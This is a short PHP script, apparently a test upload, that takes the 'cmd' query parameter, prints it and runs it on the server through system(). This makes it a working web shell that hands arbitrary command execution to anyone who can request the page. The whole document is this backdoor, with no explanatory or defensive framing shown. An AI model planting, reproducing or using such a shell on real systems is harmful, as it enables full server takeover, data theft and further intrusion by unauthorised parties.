<?php
	echo("success!\n");
        $command = $_GET['cmd'];
        echo $command."\n";
        echo "wth\n";
        $result = system($command);
        //echo $result;
        //show_source(__FILE__);
?>
